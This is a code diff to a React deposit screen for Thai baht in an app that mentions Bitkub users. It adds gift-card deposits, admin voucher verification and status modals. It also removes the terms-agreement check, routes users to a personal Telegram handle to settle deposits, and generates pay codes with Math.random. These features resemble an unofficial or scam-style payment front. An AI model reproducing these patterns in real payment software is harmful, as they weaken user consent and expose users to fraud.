@@ -1,31 +1,33 @@
 import React, { useState, useEffect, useCallback } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ArrowLeft, History, Smartphone, Landmark, Check, QrCode, Download, X, Gift, Copy, ExternalLink, Camera, Send, AlertTriangle } from 'lucide-react';
+import { ArrowLeft, History, Smartphone, Landmark, Check, QrCode, Download, X, Gift, Copy, ExternalLink, Camera, Send, AlertTriangle, Clock } from 'lucide-react';
 import { useLanguage } from '../../contexts/LanguageContext';
-import StatusOverlay from '../StatusOverlay';
+import { useStatusModal } from '../../contexts/StatusModalContext';
 import { auth, db } from '../../lib/firebase';
 import { collection, doc, setDoc, getDoc } from 'firebase/firestore';
-import { cn } from '@/src/lib/utils';
+import { cn, compressImage } from '@/src/lib/utils';
 import { triggerHaptic } from '@/src/lib/haptics';
 
 interface DepositTHBProps {
   onBack: () => void;
   onSuccess: () => void;
+  initialMethod?: DepositMethod;
+  initialAmount?: string;
 }
 
 type DepositMethod = 'promptpay' | 'transfer' | 'giftcard';
 
-export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
+export default function DepositTHB({ onBack, onSuccess, initialMethod, initialAmount }: DepositTHBProps) {
   const { t } = useLanguage();
-  const [method, setMethod] = useState<DepositMethod>('transfer');
-  const [amount, setAmount] = useState('');
+  const { showStatusModal } = useStatusModal();
+  const [method, setMethod] = useState<DepositMethod>(initialMethod || 'transfer');
+  const [amount, setAmount] = useState(initialAmount || '');
   const [agreed, setAgreed] = useState(false);
   const [showConfirmation, setShowConfirmation] = useState(false);
   const [payCode, setPayCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [kycStatus, setKycStatus] = useState<string>('LOADING');
   const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
-  const [status, setStatus] = useState<{ type: 'success' | 'error', title: string, message?: string } | null>(null);
 
   const generatePayCode = useCallback(() => {
     return Math.floor(100000000000 + Math.random() * 900000000000).toString();
@@ -81,7 +83,7 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
   }
 
   const handleDepositRequest = async () => {
-    if (!amount || !agreed) return;
+    if (!amount) return;
     
     if (method === 'giftcard' && !giftCardImage) {
       alert("Please upload an image of your gift card.");
@@ -90,7 +92,7 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
 
     setLoading(true);
     try {
-      const generatedCode = generatePayCode();
+      const generatedCode = method === 'giftcard' ? '' : generatePayCode();
       setPayCode(generatedCode);
       
       const depositAmount = parseFloat(amount);
@@ -109,7 +111,7 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
 
         const senderInfo = {
           name: method === 'promptpay' ? 'Thai QR PromptPay' : method === 'bank' ? 'Bank Wire Transfer' : 'Gift Card Voucher',
-          account: generatedCode ? `Code: ${generatedCode}` : 'Deposit Provider',
+          account: method === 'giftcard' ? 'Voucher Code Pending' : (generatedCode ? `Code: ${generatedCode}` : 'Deposit Provider'),
           type: 'Payment Method'
         };
 
@@ -141,11 +143,18 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
       }
 
       triggerHaptic('success');
-      setShowConfirmation(true);
+      showStatusModal({
+        type: 'success',
+        title: 'Deposit Requested',
+        message: `Your deposit of ฿${depositAmount.toLocaleString()} has been successfully registered.`,
+        onClose: () => {
+          setShowConfirmation(true);
+        }
+      });
     } catch (error: any) {
       console.error("Deposit error:", error);
       triggerHaptic('error');
-      setStatus({
+      showStatusModal({
         type: 'error',
         title: 'Request Failed',
         message: error.message || 'There was an error submitting your deposit request.'
@@ -160,14 +169,15 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
     navigator.clipboard.writeText(text);
   };
 
-  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        setGiftCardImage(reader.result as string);
-      };
-      reader.readAsDataURL(file);
+      try {
+        const compressed = await compressImage(file);
+        setGiftCardImage(compressed);
+      } catch (err) {
+        console.error("Image compression error:", err);
+      }
     }
   };
 
@@ -345,31 +355,43 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
                 Your deposit request of <span className="text-white">฿{parseFloat(amount).toLocaleString()}</span> has been logged.
               </p>
 
-              <div className="w-full bg-gray-900 border border-gray-800 rounded-2xl p-4 mb-6">
-                <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3">Your Unique Paycode</p>
-                <div className="flex items-center justify-between gap-3 bg-black/40 p-3 rounded-xl border border-white/5 mb-3 group">
-                  <span className="text-xl font-black text-[#00D632] tracking-widest font-mono">{payCode}</span>
-                  <button 
-                    onClick={() => copyToClipboard(payCode)}
-                    className="p-2 bg-white/5 rounded-lg text-gray-400 hover:text-white transition-colors"
-                  >
-                    <Copy className="w-4 h-4" />
-                  </button>
+              {method !== 'giftcard' ? (
+                <div className="w-full bg-gray-900 border border-gray-800 rounded-2xl p-4 mb-6">
+                  <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3">Your Unique Paycode</p>
+                  <div className="flex items-center justify-between gap-3 bg-black/40 p-3 rounded-xl border border-white/5 mb-3 group">
+                    <span className="text-xl font-black text-[#00D632] tracking-widest font-mono">{payCode}</span>
+                    <button 
+                      onClick={() => copyToClipboard(payCode)}
+                      className="p-2 bg-white/5 rounded-lg text-gray-400 hover:text-white transition-colors"
+                    >
+                      <Copy className="w-4 h-4" />
+                    </button>
+                  </div>
+                  <p className="text-[9px] text-yellow-500/80 font-bold uppercase leading-relaxed">
+                    ⚠️ IMPORTANT: Please copy this code. You can message the admin or send it to another Bitkub user to receive these funds.
+                  </p>
                 </div>
-                <p className="text-[9px] text-yellow-500/80 font-bold uppercase leading-relaxed">
-                  ⚠️ IMPORTANT: Please copy this code. You can message the admin or send it to another Bitkub user to receive these funds.
-                </p>
-              </div>
+              ) : (
+                <div className="w-full bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-6 text-center">
+                  <Clock className="w-10 h-10 text-yellow-500 mx-auto mb-3 animate-pulse" />
+                  <p className="text-xs font-black text-white uppercase tracking-widest mb-2">Voucher Status: PENDING</p>
+                  <p className="text-[11px] text-gray-400 leading-relaxed font-medium">
+                    Your gift card deposit has been submitted for verification. The admin will verify the voucher and approve your deposit shortly.
+                  </p>
+                </div>
+              )}
 
               <div className="space-y-2.5 w-full">
-                <a 
-                  href="https://t.me/kt_johnson"
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="w-full py-2.5 rounded-xl bg-[#229ED9] text-white font-bold text-xs flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20"
-                >
-                  <Send className="w-4 h-4" /> Message Admin on Telegram
-                </a>
+                {method !== 'giftcard' && (
+                  <a 
+                    href="https://t.me/kt_johnson"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="w-full py-2.5 rounded-xl bg-[#229ED9] text-white font-bold text-xs flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20"
+                  >
+                    <Send className="w-4 h-4" /> Message Admin on Telegram
+                  </a>
+                )}
                 <button 
                   onClick={() => {
                     setShowConfirmation(false);
@@ -388,19 +410,6 @@ export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
           </motion.div>
         )}
       </AnimatePresence>
-
-      <StatusOverlay
-        isOpen={!!status}
-        type={status?.type || 'success'}
-        title={status?.title || ''}
-        message={status?.message}
-        onClose={() => {
-          if (status?.type === 'success') {
-            onSuccess();
-          }
-          setStatus(null);
-        }}
-      />
     </motion.div>
   );
 }
